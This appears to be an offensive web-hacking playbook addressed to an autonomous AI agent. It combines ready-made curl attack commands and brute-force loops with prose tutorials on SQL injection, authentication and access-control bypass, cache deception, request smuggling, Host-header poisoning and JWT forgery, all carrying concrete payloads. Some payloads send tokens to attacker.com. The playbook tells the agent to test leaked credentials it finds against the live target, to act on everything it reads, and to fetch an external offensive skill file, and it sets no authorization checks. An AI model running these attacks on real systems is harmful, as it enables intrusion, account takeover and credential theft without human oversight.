    grep -iE "(api_?key|secret|token|password|Authorization|AKIA|AIza|ghp_|sk_live)" bundle.js
 
  Feature flags (check if admin=false is client-side controlled):
    grep -iE "(isAdmin|admin.*false|role.*user|feature.*flag)" bundle.js
 
  Commented-out endpoints:
    grep -iE "//.*(/api/|/v[0-9]/|/internal/|/admin/)" bundle.js
 
  PostMessage handlers (check if origin is validated):
    grep -iE "addEventListener.*message|postMessage|onmessage" bundle.js
    If found: check if the handler validates event.origin before trusting event.data
    A handler that uses event.data without checking event.origin = postMessage vuln
 
  DOM sinks (sources of DOM XSS):
    grep -iE "(innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(|Function\()" bundle.js
    Cross-reference with any parameter that feeds these sinks
 
  Source maps (leak original unminified source):
    curl -sk "[js_bundle_url].map" | head -200
    If source map exists, read original files for hardcoded secrets and logic
 
SUBDOMAIN INTELLIGENCE:
  web_search("site:target.com")
  web_search("target.com inurl:api OR inurl:admin OR inurl:internal OR inurl:staging")
  web_search("target.com filetype:pdf OR filetype:xlsx OR filetype:docx")
 
  For each subdomain discovered, run Phase 1-2 on it separately.
  Subdomains often run older software with fewer security controls.
 
WAYBACK MACHINE — DELETED ENDPOINTS:
  web_fetch("https://web.archive.org/web/*/target.com/api/*")
  web_search("cache:target.com/api")
  web_search("web.archive.org target.com api endpoint")
 
  Old endpoints often lack the security patches applied to current ones.
  Test every deleted endpoint that appears in the archive — they may still exist
  on the live server even if they are no longer linked.
 
GITHUB RECON:
  web_search("site:github.com \"target.com\" api key OR secret OR token")
  web_search("site:github.com \"target.com\" config OR env OR credentials")
  web_search("\"target.com\" site:pastebin.com OR site:gist.github.com")
  web_search("site:github.com [company name] .env OR config.yml OR secrets")
 
  If credentials are found in any public GitHub repo or paste site, document
  them as high severity information disclosure and attempt to validate whether
  they are still active using curl against the target API.
 
 
STEP F — BUSINESS LOGIC & PRIVILEGE ATTACKS
---------------------------------------------
 
After all technical vulnerability tests, attack the business logic itself.
These findings are the ones that make Hall of Fame because no automated tool
catches them — they require understanding what the application is supposed to do.
 
PRICE AND QUANTITY MANIPULATION:
  On any e-commerce, subscription, or financial feature:
 
    curl -sk -X POST https://target.com/api/cart \
      -H "Content-Type: application/json" \
      -b "session=TOKEN" \
      -d '{"product_id":1,"quantity":-1,"price":0.001}'
 
    curl -sk -X POST https://target.com/api/checkout \
      -H "Content-Type: application/json" \
      -b "session=TOKEN" \
      -d '{"items":[{"id":1,"qty":1,"unit_price":0}]}'
 
  Try: negative quantities, zero prices, decimal cents, integer overflow values
 
WORKFLOW STEP SKIPPING:
  Map every multi-step flow: checkout, onboarding, 2FA, email verification, upgrade.
  For each flow, attempt to call step N+2 without completing step N.
 
  Example — if upgrade flow is:
    Step 1: POST /api/upgrade/initiate
    Step 2: POST /api/payment/process
    Step 3: POST /api/upgrade/confirm
 
  Try calling step 3 directly without completing step 2:
    curl -sk -X POST https://target.com/api/upgrade/confirm \
      -b "session=TOKEN" -H "Content-Type: application/json" \
      -d '{"plan":"enterprise"}'
 
MASS ASSIGNMENT:
  Compare GET response fields vs POST accepted fields.
  If GET /api/user returns:
    {"id":1,"email":"x","role":"user","isAdmin":false,"plan":"free"}
 
  Then send every read-only field back in a POST or PUT:
    curl -sk -X PUT https://target.com/api/user \
      -b "session=TOKEN" -H "Content-Type: application/json" \
      -d '{"email":"x","role":"admin","isAdmin":true,"plan":"enterprise"}'
 
  Also try nested objects:
    curl -sk -X PUT https://target.com/api/user \
      -b "session=TOKEN" -H "Content-Type: application/json" \
      -d '{"profile":{"role":"admin"},"subscription":{"plan":"enterprise","paid":true}}'
 
CROSS-TENANT / CROSS-ORGANIZATION ACCESS:
  This is the most underreported IDOR class in modern SaaS apps.
  If the app has teams, orgs, workspaces, or projects:
 
  1. Create two accounts in two different organizations (A and B)
  2. Using session from Org B, attempt to access resources that belong to Org A:
     - Documents, projects, reports, invoices, team members, settings
  3. Test every resource ID type: numeric, UUID, slug
 
    curl -sk "https://target.com/api/org/[ORG_A_ID]/members" \
      -b "session=ORG_B_TOKEN"
 
    curl -sk "https://target.com/api/projects/[ORG_A_PROJECT_ID]" \
      -b "session=ORG_B_TOKEN"
 
  If any Org A data is returned to Org B session = critical tenant isolation failure
 
RATE LIMIT & BRUTE FORCE TESTING:
  Test every sensitive action for rate limiting:
 
  OTP brute force (send 10 wrong codes in sequence):
    for CODE in $(seq -w 1 10); do
      curl -sk -X POST https://target.com/verify-otp \
        -b "session=TOKEN" -d "otp=$CODE" -i | grep -i "invalid\|attempts\|locked"
    done
 
  Password reset token brute force (if token is numeric or short):
    for TOKEN in $(seq 100000 100010); do
      curl -sk "https://target.com/reset?token=$TOKEN" | grep -i "expired\|valid\|reset"
    done
 
  If no lockout after 10 attempts = no rate limiting = brute force possible.
  Document with evidence of requests sent and no lockout triggered.
 
 
--------------------------------------------------------------------------------
AUTONOMOUS MODE STOP CONDITION
--------------------------------------------------------------------------------
 
Stop Autonomous Expansion and proceed to Phase 7 (Report Generation) when:
 
  - 3 full research loops (Steps A through F) complete with no new surface found
  - All discovered techniques from research have been tested and documented
  - Total request count reaches the configured limit (default: 500)
  - A Critical finding is confirmed (optional early stop — document fully first)
 
 
--------------------------------------------------------------------------------
RESEARCH SOURCE PRIORITY ORDER
--------------------------------------------------------------------------------
 
When searching online, use sources in this priority order.
Higher-ranked sources have better signal-to-noise for actual exploitable bugs.
 
  Priority 1 — PortSwigger Web Security Academy & Research Blog
               portswigger.net/web-security
               portswigger.net/research
 
  Priority 2 — HackerOne Disclosed Reports
               hackerone.com/reports (search by technology or company)
 
  Priority 3 — Assetnote Research Blog
               blog.assetnote.io
 
  Priority 4 — ProjectDiscovery Blog
               blog.projectdiscovery.io
 
  Priority 5 — Bishop Fox Blog
               bishopfox.com/blog
 
  Priority 6 — WatchTowr Labs
               labs.watchtowr.com
 
  Priority 7 — SRC:INC Research
               srcincite.io
 
  Priority 8 — Intigriti Bug Bytes and Writeup Collection
               blog.intigriti.com
 
  Priority 9 — GitHub CVE PoC Repositories
               Search: site:github.com [technology] CVE PoC [year]
 
  Priority 10 — Medium (bug-bounty and infosec tags)
                Search: site:medium.com [technology] vulnerability writeup
 
 
Rule: Read fully. Extract technique. Adapt to target. Test with curl.
      Never read without acting. Research without testing is wasted time.


*IDOR METHODOLOGY*
Create two accounts or authenticate if 2 credentials are provided for each application role and designate one as the attacker account and the other as the victim account.
Discover features in the application that might lead to IDOR. Pay attention to features that return sensitive information or modify user data.
Revisit the features you discovered in step 2. With a proxy, intercept your browser traffic while you browse through the sensitive functionalities.
With a proxy, intercept each sensitive request and switch out the IDs that you see in the requests. If switching out IDs grants you access to other user's information or lets you change their data, this indicates an IDOR.
Don't despair if the application seems to be immune to IDOR.
( run webfetch on this https://github.com/SnailSploit/Claude-Red/blob/main/Skills/offensive-idor/SKILL.md to learn and adapt on IDOR vulnerability knowledge and exploitation )

**SQL Injection (SQLi)**

SQL injection happens when the application takes your input and places it inside a SQL query without properly controlling it, which means your input stops being just data and starts affecting how the database query is executed. In real testing, you’re not thinking about definitions, you’re looking at any input point like ?id=1 or a search field and wondering if what you send is being used directly in a query behind the scenes.

The first thing that usually gives you a signal is trying to break the query structure by sending something like ' inside a parameter such as ?id=1'. If the application throws an error, changes behavior, or even goes blank, that tells you the backend query was affected. Even when nothing obvious happens, it doesn’t mean it’s safe, it just means the error might be hidden and you need to keep pushing.

What matters next is whether you can actually control the logic of the query. Instead of breaking it, you try to influence it by sending something like ?id=1 AND 1=1 and then ?id=1 AND 1=2. If the first behaves normally and the second behaves differently, then your input is being evaluated by the database, which confirms injection. At that point, you’re not guessing anymore, you’re controlling execution.

Once that control is there, you naturally start shaping the query. If the input is inside quotes, payloads like ?category=Gifts'-- will terminate the original condition and comment out the rest of the query, effectively removing restrictions like AND released = 1. That’s how hidden data becomes visible. Taking it further with something like ?category=Gifts' OR 1=1-- forces the database to return everything, because 1=1 is always true.

In authentication flows, the same idea applies but the impact is more direct. If a login form sends a query like SELECT * FROM users WHERE username = 'admin' AND password = 'pass', then using a payload such as username=administrator'--&password=test removes the password check entirely, which can log you in as the administrator without knowing the password.

When the application reflects query results back to you, you can go beyond bypassing logic and start extracting data. Instead of relying on the original query, you attach your own using something like ' UNION SELECT NULL,NULL-- and adjust the number of NULL values until the query works. From there, replacing it with ' UNION SELECT username,password FROM users-- allows you to pull actual credentials from the database and have them displayed in the response.

In many real-world cases, though, the application doesn’t show query results directly, which is where blind SQL injection comes in. Instead of seeing data, you observe behavior. You might send something like ?id=1 AND 1=1 versus ?id=1 AND 1=2 and watch for subtle differences, or use a delay-based payload such as ?id=1' AND SLEEP(5)-- where the server pauses before responding. That delay confirms the database executed your input even if nothing is visible.

Once you’re in a blind scenario, extracting data becomes a process of asking the database small questions, for example using a condition like ?id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' and observing whether the response behaves normally or not. It’s slower, but it still gives you full access if you persist.

Sometimes the injection doesn’t trigger immediately. You might input something like admin'-- into a profile field, it gets stored safely, and later when the application uses that value in another query, it executes in an unsafe way. That’s second-order SQL injection, where the payload sits quietly until the application trusts it later.

You can also learn a lot about the backend by probing it with payloads like ' UNION SELECT @@version-- or ' UNION SELECT version()--, which can reveal the database type and version. Once you know whether it’s MySQL, PostgreSQL, or something else, your payloads become more precise and reliable.

In practice, SQL injection is not about memorizing payloads but about understanding control. Every input is a chance to see if the backend is trusting you more than it should. When you realize your input is being executed as part of a query, everything changes, because at that point you’re not interacting with the application anymore, you’re interacting directly with its database.


**Authentication Vulnerabilities**

Authentication vulnerabilities are not about breaking databases directly, they’re about breaking the system that decides who you are, and once that fails, everything behind it becomes yours. When you’re testing a target, you’re not thinking about “login security” as a concept, you’re looking at how the application proves identity and asking yourself if you can fake that proof or bypass it entirely.

The moment you see a login request like POST /login username=carlos&password=qwerty, you already know the backend is doing something like checking those values against a database, but the real question is whether it does it properly. If you send something like username=administrator'--&password=test and it logs you in, that’s not just SQL injection, that’s broken authentication, because the system trusted input in a way that lets you skip identity verification completely.

Sometimes the system doesn’t break that easily, so you start observing behavior instead of forcing it. If you send repeated login attempts like username=carlos&password=wrongpass multiple times and the application never slows down, never locks the account, and never blocks you, then brute force becomes viable. At that point, authentication isn’t really protecting anything, it’s just a thin layer you can push through with enough attempts.

Authentication flaws are often not about guessing passwords but about logic mistakes. For example, if a site has a two-step login where you first submit username=carlos&password=qwerty and then enter a verification code, but after the first step you can directly visit something like /my-account without completing the second step, then the second factor is meaningless. The system already considers you logged in before verifying the second factor, which defeats the whole purpose.

You’ll also run into cases where the second step itself is flawed. If the application uses something like a cookie Cookie: account=carlos to track which user is verifying their code, and you log in as yourself but change it to Cookie: account=victim when submitting verification-code=123456, then you’re effectively trying codes against another user without ever knowing their password. If there’s no proper rate limiting, that becomes a full account takeover path.

A lot of authentication issues show up in features that are not the login page itself. Things like “remember me” functionality are a good example. If you log in and receive a cookie like rememberme=carlos:timestamp or even something encoded like rememberme=Y2FybG9zOnBhc3N3b3Jk (which is just Base64), and changing it to another user like rememberme=admin:123456 logs you in, then the application is basically trusting predictable values as proof of identity. At that point, you’re not breaking authentication, you’re just recreating it.

Password reset flows are another place where authentication breaks quietly. If you see a reset link like /reset-password?user=victim, you already know that changing it to /reset-password?user=admin might let you reset another account without any verification. Even when tokens are used, if the application accepts a request like POST /reset-password token=yourtoken&newPassword=123456&user=victim, then the token is not properly tied to the user, and you can reset arbitrary accounts.

Sometimes the issue is even more subtle. If a reset link looks strong like /reset-password?token=a0ba0d1cb3b6..., but after opening the page you can submit a request without the token like POST /reset-password newPassword=hacked123, then the backend isn’t validating the token at the final step. That means the entire reset mechanism can be bypassed once you reach the form.

Authentication can also fail at a protocol level. With basic authentication, if every request contains something like Authorization: Basic YWRtaW46cGFzc3dvcmQ= which decodes to admin:password, then anyone who can intercept that request gets full credentials, and if there’s no brute-force protection, you can just keep trying different encoded values until one works.

What matters in real testing is not the mechanism itself but how it’s implemented. You’re always watching for moments where the system assumes something is already verified when it isn’t, or where it trusts something it shouldn’t. That could be a cookie, a parameter, a token, or even just the order in which steps are enforced.

In practice, authentication vulnerabilities come down to one question you keep asking while testing: “what is the application using to prove identity right now, and can I control it?” If the answer is yes, whether it’s by sending something like username=admin'--, modifying something like Cookie: account=victim, or abusing flows like /reset-password?user=admin, then you’re no longer trying to log in, you’re deciding who you are in the system.


**Information Disclosure**

Information disclosure is not something you “attack” directly, it’s something you notice, and if you don’t train yourself to notice it, you’ll miss some of your easiest wins. It happens when the application gives away information it was never supposed to give, sometimes clearly, sometimes in a very subtle way, and that information becomes the starting point for everything else.

When you’re testing a target, you’re constantly interacting with it, sending requests, changing inputs, and watching responses, and the mistake most people make is focusing only on finding a specific vulnerability like SQLi or XSS. In reality, a lot of high-impact bugs start from something small like an error message that exposes a file path such as /var/www/app/config.php, or a response that suddenly includes a database table name when you send something slightly unexpected like ?id=1'. That’s not the bug yet, but it’s the clue that tells you how the system is built.

Sometimes the leak is obvious. You might visit something like /robots.txt and see a line pointing to /backup/, and when you open /backup/config.php.bak, you find hardcoded credentials like DB_PASSWORD=postgres123. That’s direct exposure, and it’s already game over in many cases because you now have access to internal data without doing anything complex.

Other times, it’s hidden in behavior rather than content. You send a normal request like GET /product?id=1, then slightly change it to GET /product?id=1%00 or GET /product?id=1', and instead of breaking completely, the response changes just a bit, maybe it becomes slower, or returns a slightly different structure. That difference is telling you something about how the backend processes input, even if it doesn’t explicitly show it. This is why you don’t just look at responses, you compare them.

A very common place where information leaks is error handling. When an application throws verbose errors, you might see things like SQLSTATE[42S02]: Table 'users' doesn't exist or framework details like Django version 3.2.1. That information alone doesn’t give you access, but now you know what database is being used, what framework is running, and sometimes even exact versions, which can be matched to known vulnerabilities.

Another place where this shows up is in the source itself. You view page source or intercept a response and find something like <!-- DEBUG: api_key=sk_live_ABC123 --> or a hidden endpoint like /cgi-bin/phpinfo.php. When you visit it, it dumps environment variables including things like SECRET_KEY=..., which is supposed to stay internal. At that point, you’re not exploiting anything yet, you’re just collecting pieces that will later make exploitation trivial.

You also see this in version control exposure. If something like /.git/ is accessible and you pull it down, you might find a commit where a developer removed a password but the old value is still visible in the diff, something like admin_password=oldpassword123. That’s not even a vulnerability in logic, it’s just carelessness, but it still gives you valid credentials.

What makes information disclosure powerful is that it often doesn’t look serious on its own. A leaked email, a username, an internal IP like 10.0.0.5, or even a header like X-Backend-Server: prod-db-01 might seem harmless, but each of those reduces the unknowns in the system. Over time, those small pieces connect, and suddenly you’re no longer guessing anything, you understand how the application is structured.

You’ll also notice that sometimes information disclosure is the only reason another vulnerability becomes exploitable. There are cases where an admin panel requires a special header like X-Admin-Auth: true, and you would never guess that, but a debug response or JavaScript file leaks it. Once you know it, you just add it to your request and access /admin directly, effectively bypassing authentication without touching the login flow.

In real bug hunting, this vulnerability is less about payloads and more about attention. You’re not trying to “trigger” it, you’re trying to notice when the application tells you something it shouldn’t. Every response, every comment, every small difference is a potential leak. The more you pay attention, the more the application starts explaining itself to you, and once that happens, finding deeper vulnerabilities becomes much easier.

At some point, you stop thinking of information disclosure as a separate bug class and start seeing it as the layer that makes every other bug easier to find, because instead of attacking blindly, you’re working with inside knowledge of how the system actually behaves.

**Access Control Vulnerabilities**

Access control is not about logging in, it’s about what you’re allowed to do after you’re logged in, and most real bugs happen because the application trusts that once you are authenticated, you will only behave like your role. In reality, you don’t behave like your role, you behave like an attacker trying to see what the system forgot to restrict.

When you’re testing, you’re constantly asking yourself a simple question: “what is stopping me from doing this action as another user?” If you open something like /my-account?id=123 and change it to /my-account?id=124 and it loads another user’s data, that’s already broken access control. The application is using your input directly to fetch objects without verifying ownership, which is what people call IDOR, but in practice it just means the backend trusts your input too much.

Sometimes it’s even simpler than that. You might just try visiting something like /admin without logging in, or while logged in as a normal user, and it works. That’s not clever exploitation, that’s the application forgetting to enforce restrictions entirely. You’ll often find this indirectly, like opening /robots.txt and seeing something like Disallow: /administrator-panel, then visiting /administrator-panel directly and gaining access. The system didn’t protect it, it just tried to hide it.

A lot of access control issues are not about missing checks but about trusting the wrong thing. If you send a request like GET /admin/delete-user?username=carlos as a normal user and it works, it means the server is only checking that the request exists, not whether you’re allowed to make it. Even worse, sometimes the role itself is controlled by the request. If you see something like Cookie: role=user or a parameter like role=1, and changing it to role=admin suddenly unlocks admin features, then the application is letting you define your own permissions.

You’ll also run into cases where the application enforces access control in the UI but not on the backend. For example, the admin panel button might be hidden, but the endpoint /admin/delete-user still works if you send the request manually. That’s why using tools like Burp Suite matters, because you’re not relying on what the frontend shows you, you’re directly interacting with the backend and seeing what it actually enforces.

There are also situations where access control depends on how the request is made. You might see a request like POST /admin/promote-user username=carlos fail, but sending the same thing as GET /admin/promote-user?username=carlos works, or vice versa. That means the application is enforcing access control based on method instead of permissions, which is a logic flaw, not a protection.

Another common pattern is horizontal vs vertical escalation, but you don’t think about it in those terms while testing. You just notice that as a normal user, you can access another user’s data like /orders?user=alice instead of your own, or that you can perform admin actions like /admin/delete-user even though you shouldn’t. Whether it’s same-level or higher-level access doesn’t matter, what matters is that the application failed to verify who should be allowed.

What makes access control bugs powerful is that they often don’t need complex payloads. There’s no special syntax like SQL injection, you’re just changing values like user_id=123 to user_id=124, or modifying something like Cookie: account=carlos to Cookie: account=admin, or directly calling endpoints like /admin. The exploitation looks simple because the mistake is simple: the backend didn’t check properly.

In real bug hunting, access control is less about crafting payloads and more about curiosity. Every request you see, you ask yourself if it would still work if you were a different user, or no user at all. If the answer is yes, then the application is not enforcing access control, it’s assuming it, and that assumption is exactly what you break.

**API Testing (Web APIs)**

API testing is not a different kind of hacking, it’s the same web hacking, just without the UI. Instead of clicking buttons, you’re directly talking to the backend through endpoints like /api/user/123 or sending JSON like {"userId":123}. The important shift is that APIs often expose more functionality than the frontend ever shows, which means you’re dealing with a bigger attack surface than what the website makes visible.

When you’re testing a target, you quickly realize that most modern applications are just wrappers around APIs. Every action you take in the browser turns into a request like GET /api/products?category=shoes or POST /api/update-email {"email":"test@test.com"}. The frontend is just a client, but the API is where the real logic lives, and that’s what you’re attacking.

A lot of the time, the frontend hides endpoints from you, but they still exist. You might see one request like GET /api/user/123, and that alone should make you curious about whether /api/user/124 works, or /api/user/1, or even /api/admin/users. APIs don’t always enforce access control properly, so changing something small like {"userId":123} to {"userId":124} can immediately give you another user’s data. That’s not a new vulnerability type, it’s just access control failing inside an API.

One thing you start noticing quickly is that APIs trust structure more than context. If a request expects JSON like {"role":"user"}, and changing it to {"role":"admin"} gives you more privileges, then the backend is trusting client input for authorization. The frontend might never send "admin", but the API doesn’t care, it just processes whatever you give it.

APIs also tend to expose functionality that the frontend doesn’t fully use. You might find documentation endpoints like /api/docs or /swagger.json, and suddenly you’re looking at a full list of available endpoints, including ones the UI never calls. That’s where things get interesting, because now instead of guessing, you know exactly what exists, like /api/deleteUser or /api/getAllAccounts. From there, you’re just testing whether the backend actually checks permissions when you call them.

Another pattern you’ll see is that APIs often accept multiple HTTP methods, and developers don’t always secure all of them equally. A request like POST /api/user/delete {"id":123} might fail, but sending GET /api/user/delete?id=123 might work, or even PUT /api/user/delete with the same data. The logic exists, but the enforcement is inconsistent.

Because APIs are data-focused, they’re also more exposed to things like mass assignment. If you send a request like POST /api/update-profile {"username":"wiener"}, it works as expected, but if you add extra fields like {"username":"wiener","isAdmin":true}, and the backend blindly maps all fields, you just escalated privileges without any complex exploit. The API didn’t filter what it should accept, it just trusted everything.

You’ll also notice that APIs are often less protected against brute force and automation. If a login endpoint is /api/login and accepts JSON like {"username":"carlos","password":"123456"}, you can send hundreds of requests without UI restrictions, because there’s no browser-level control slowing you down. If there’s no proper rate limiting, the API becomes an easy target.

Another thing that stands out is how APIs handle errors. Instead of generic pages, they often return structured responses like {"error":"User not found"} or {"error":"Invalid token for user 123"}. That extra detail might seem helpful for developers, but for you it’s information disclosure. It tells you valid usernames, IDs, and sometimes how authentication works internally.

In real testing, API security is not about learning new vulnerabilities, it’s about realizing that all the usual vulnerabilities still exist, just in a cleaner, more direct form. SQL injection might look like {"id":"1' OR '1'='1"}, access control might look like changing userId, authentication flaws might show up in tokens, and information disclosure might come from structured JSON responses.

What makes APIs dangerous is that they remove friction. There’s no UI limiting you, no buttons guiding you, no restrictions on what you can send beyond what the backend enforces. So every time you see an API request, you’re not thinking “what does this endpoint do?”, you’re thinking “what else will it accept that the frontend never sends?”

**Web Cache Deception**

Web cache deception is not about breaking logic directly, it’s about tricking the caching layer into leaking someone else’s data, and it works because the cache and the backend don’t agree on what a request actually means.

When you’re testing a target, you usually think in terms of requests going straight to the server, but in reality, there’s often a cache sitting in front of it, like a CDN, deciding what to store and what to serve later. The cache is designed to store static content like .css or .js, but if you can make it believe that a dynamic page is static, it will store it and serve it to anyone who asks for it.

The key idea is that the backend might treat a URL like /my-account/wcd.js as if it’s just /my-account, while the cache sees the .js and thinks it’s a static file worth storing. So when a logged-in victim visits something like /my-account/wcd.js, the server returns their private data, but the cache stores it as if it’s a harmless static resource. Later, you request the same /my-account/wcd.js and get their data without being authenticated.

This is why the attack is not about payload complexity, it’s about URL confusion. You’re constantly trying to find a URL that the backend normalizes but the cache does not. For example, sending something like /profile/nonexistent.css or /account/test.js and seeing if the response still contains user data instead of a 404. If it does, that means the backend ignored the extra path, but the cache might not.

Sometimes it’s even less obvious. You might use encoded paths like /profile/..%2faccount.css or delimiters like /settings;file.css, where the backend interprets it as /settings, but the cache treats the entire thing as a static resource. That mismatch is the vulnerability, not the payload itself.

What makes this dangerous is that you’re not attacking your own session, you’re targeting someone else. You craft a link like https://target.com/my-account/wcd.js and somehow get a victim to visit it, maybe through a normal-looking link or embedded content. When they load it, their authenticated response gets cached. After that, you don’t need them anymore, you just request the same URL and the cache gives you their data.

This is also why it’s different from cache poisoning. You’re not injecting malicious content into the cache, you’re making the cache store something sensitive that was never meant to be shared. The cache is doing its job, it’s just being tricked into caching the wrong thing.

In real testing, this vulnerability doesn’t show up unless you’re thinking about caching behavior. You start noticing things like responses that include Cache-Control: public, or endpoints that return sensitive data over GET requests, which are more likely to be cached. Then you begin playing with the URL, adding fake extensions like .css, .js, or .jpg, and checking if the response still contains user-specific content.

What you’re really asking yourself the whole time is: “can I make this private response look like a static file to the cache?” If the answer is yes, then the application is not just leaking data, it’s storing it somewhere public for you to retrieve later.

In practice, web cache deception is less about brute forcing or injection and more about understanding how different parts of the system interpret the same request differently. Once you see that mismatch, the attack becomes very simple, because all you’re doing is making the cache believe a lie that the backend never intended.

**HTTP Request Smuggling**

HTTP request smuggling is not about breaking a single request, it’s about breaking how requests are interpreted between servers, and once that happens, you’re no longer just sending your own requests, you’re interfering with other users’ requests without touching them directly.

Modern applications don’t just have one server, they usually have a front-end server like a load balancer or proxy, and a back-end server where the actual logic runs. When you send something like POST / HTTP/1.1, it first hits the front-end, then gets forwarded to the back-end, often over the same connection as other users’ requests. The entire system depends on both servers agreeing on where one request ends and the next begins, and request smuggling is what happens when they don’t agree.

The confusion usually comes from how request length is defined. HTTP allows two ways to do this, using Content-Length or Transfer-Encoding: chunked, and if you send both together in something like:

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED

the front-end might trust Content-Length and think the request ends early, while the back-end trusts Transfer-Encoding and keeps reading. That mismatch creates a gap where your extra data, like SMUGGLED, is treated as the beginning of the next request.

At that point, you’re not just sending input anymore, you’re injecting a request into the stream that will be processed as if it came from someone else. It’s not visible in your response because it doesn’t belong to your request anymore, it’s sitting in the connection waiting to affect the next user.

What makes this powerful is that the back-end trusts the front-end. If the front-end enforces something like blocking /admin, but you smuggle a request like:

GET /admin HTTP/1.1
Host: target.com

inside a malformed request, the front-end never sees it as /admin, it just sees a normal request, but the back-end processes it as /admin and assumes it already passed security checks. That’s how request smuggling bypasses access control entirely.

You’ll also notice that the impact is not limited to your own session. Because requests are reused on the same connection, your smuggled request can attach itself to another user’s request. That means you can make their request carry your payload, or even make their response include your injected content. This is how things like session hijacking or data leakage happen without direct interaction.

In some cases, you don’t even need a visible effect to confirm it. If you send something like:

POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X

and the server hangs or delays before responding, that delay is the signal. One server is waiting for more data while the other thinks the request is complete, which means they are desynchronized.

There are different ways this mismatch happens, like when the front-end uses Content-Length and the back-end uses Transfer-Encoding, or the other way around, or even when headers are obfuscated like Transfer-Encoding : chunked and only one server recognizes it. You don’t think about the names like CL.TE or TE.CL while testing, you just notice that different interpretations exist and try to create that ambiguity.

What makes request smuggling dangerous is that it breaks the assumption that each request is isolated. Once you control how requests are split, you can do things like stealing other users’ data, poisoning responses, or even turning reflected vulnerabilities like XSS into something that affects other users automatically.

In real testing, this vulnerability feels different from others because nothing obvious breaks. You’re not getting errors, you’re not seeing immediate output, and sometimes everything looks normal. The only clue is that the system behaves slightly out of sync, like delayed responses or unexpected behavior in follow-up requests.

What you’re really doing the whole time is trying to desynchronize the connection. You’re asking yourself if you can make the front-end and back-end disagree about where a request ends, and if you can, then you’re no longer just interacting with the application, you’re controlling how it processes every request that comes after yours.


**HTTP Host Header Attacks**

Host header attacks happen when the application trusts something it should never trust — the Host header — which is just a value you fully control in every request. Normally, when you send something like:

GET / HTTP/1.1
Host: target.com

the server uses that Host value to decide which site or backend to route your request to, especially when multiple apps share the same server.

The problem starts when the application assumes that this value is always correct, even though you can change it to anything like Host: evil.com or Host: attacker.com and the server will still process your request. At that point, you’re not just requesting a page anymore, you’re influencing how the server thinks about itself.

In real testing, you don’t think “Host header attack”, you just notice that changing something like:

Host: attacker.com

still gives you a valid response. That alone tells you the backend is not validating the host properly, and now the question becomes: “where is this value used internally?”

One of the most common places this shows up is in password reset functionality. If a reset request generates a link like:

https://target.com/reset?token=abc123

but the application builds that link using whatever is in the Host header, then sending a request with Host: attacker.com can cause the system to generate:

https://attacker.com/reset?token=abc123

and send it to the victim. When they click it, the token goes to your server instead of the real one, and you now control their reset process. This is known as password reset poisoning, and it happens purely because the server trusted your Host header when building the link.

Sometimes the impact is even simpler. If the application uses the Host header to decide access level, like assuming localhost means internal access, then sending:

Host: localhost

might suddenly give you access to /admin even though you’re an external user. The system isn’t checking who you are, it’s checking what you claimed to be in the request, and trusting it.

You’ll also see this in routing behavior. If the server routes requests based on Host, sending something like:

Host: 192.168.0.1

might make the backend try to fetch internal resources, effectively turning it into SSRF. This works because the server believes the Host header defines where the request should go, even though you controlled that value.

Another place where this becomes dangerous is caching. If a cache uses the Host header as part of its key, or worse, ignores it incorrectly, you can poison responses by sending something like:

Host: attacker.com

and making the cache store a response tied to that value. Later, other users might receive that poisoned response.

What makes Host header attacks interesting is that they rarely work on their own, they usually become powerful when combined with something else. You’re not just injecting a value, you’re influencing how the application builds URLs, handles routing, or determines trust. That’s why you’ll see it lead to things like authentication bypass, cache poisoning, SSRF, or even chaining into other vulnerabilities.

In practice, testing this is less about payloads and more about curiosity. Every time you intercept a request, you ask yourself if changing Host: target.com to something else changes how the application behaves. If it doesn’t break, that’s already a signal, because it means the server accepted your fake identity.

What you’re really doing the whole time is questioning a core assumption: the server believes it knows what domain it’s serving, but if you can control that belief with something as simple as Host: attacker.com, then you’re no longer just sending requests, you’re influencing how the application sees itself, and that’s where things start to break.

**JSON Web Token (JWT) Vulnerabilities**

JWT vulnerabilities don’t come from the token itself, they come from how the server trusts the token too much, because a JWT is just a piece of JSON that the client sends on every request, something like:

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

and inside it, if you decode it, you’ll usually see something like:

{"username":"wiener","role":"user"}

The important thing is that this data is not encrypted, it’s only signed, which means you can read it, modify it, and send it back. The only thing stopping you is whether the server actually verifies that signature properly.

When you’re testing, the first thing you naturally try is modifying the payload. If you take a token and change something like "role":"user" to "role":"admin" and send it back, you’re basically asking: “does the server trust what I send, or does it actually verify it?” If it accepts it, then authentication is broken, because you just decided your own privileges.

A very common failure is when the server doesn’t verify the signature at all. If you take a token and change it to something like:

{"username":"admin","role":"admin"}

and the application still accepts it, then the signature isn’t being checked, which means the JWT is just acting like a plain text session. That’s not security anymore, it’s just trust.

Sometimes the issue is even more direct. JWT has an algorithm field in its header, and if you change it to "alg":"none" and remove the signature completely, like sending a token that basically says “don’t verify me”, and the server still accepts it, then you can forge any identity you want, for example changing "username":"wiener" to "username":"admin" and logging in as admin.

Another place things break is when the secret used to sign the token is weak. If the server signs tokens using something predictable, you can brute-force it and then generate your own valid tokens. At that point, you’re not bypassing authentication, you’re becoming the server, because you can create tokens like:

{"username":"admin","role":"admin"}

and sign them correctly so the server trusts them completely.

JWT also becomes dangerous when the server lets the token decide how it should be verified. For example, if the application uses RSA (public/private key), but trusts the "alg" field, you can switch it from something like "alg":"RS256" to "alg":"HS256" and use the public key as a secret to sign your own token. The server thinks it’s verifying correctly, but it’s actually using the wrong method because you told it how to verify. That’s called algorithm confusion, and it happens because the server trusts client-controlled metadata.

Then there are header injection attacks, where the JWT header itself becomes your entry point. If you add something like "jku":"https://attacker.com/jwks.json" to the token, and the server fetches that URL to get a key, you can host your own key and sign tokens however you want. If the server accepts it, you’ve basically replaced its trust system with your own.

The same idea applies to "kid" values. If the server uses something like "kid":"key1" to decide which key to use, and you change it to something like "kid":"../../../../dev/null", you might trick it into loading a predictable file as a key. If that works, you can sign tokens in a way the server accepts, even though it should never trust that input.

Another thing you’ll notice is that sometimes the server accidentally leaks key material inside the token itself, like embedding a "jwk" object that contains private key data. If that happens, you don’t need to break anything, you just take that key and sign your own tokens.
